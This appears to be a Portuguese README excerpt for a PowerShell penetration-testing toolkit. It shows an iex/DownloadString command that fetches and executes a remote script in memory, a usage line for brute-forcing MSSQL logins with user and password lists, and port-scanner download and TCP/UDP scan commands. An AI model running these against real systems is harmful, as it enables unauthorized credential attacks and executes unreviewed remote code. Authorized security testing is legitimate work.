### > Invoke-BruteMSSQL
Força bruta em servidor MSSQL:
```
iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/d3fudd/PS-Pentest/refs/heads/main/Invoke-BruteMSSQL.ps1'))
```
```
Invoke-BruteMSSQL -h target:1433 -u .\users.txt -p .\passwords.txt -d master
```

### > ps2
Port Scanner:
```
iwr -uri https://raw.githubusercontent.com/d3fudd/PS-Pentest/refs/heads/main/PS2/ps2.ps1 -o ps2.ps1
```
```
iwr -uri https://raw.githubusercontent.com/d3fudd/PS-Pentest/refs/heads/main/PS2/servicemap.csv -o servicemap.csv
```
Scan TCP:
```
.\ps2.ps1 -f .\ips_targets.txt -v -sT -topPorts 1000 -serviceMap .\servicemap.csv -b -noPing -oT .\resultado_scan_tcp.txt
```
Scan UDP:
```
.\ps2.ps1 -f .\ips_targets.txt -v -sU -topPorts 300 -serviceMap .\servicemap.csv -b -noPing -oT ..\resultado_scan_udp.txt
```
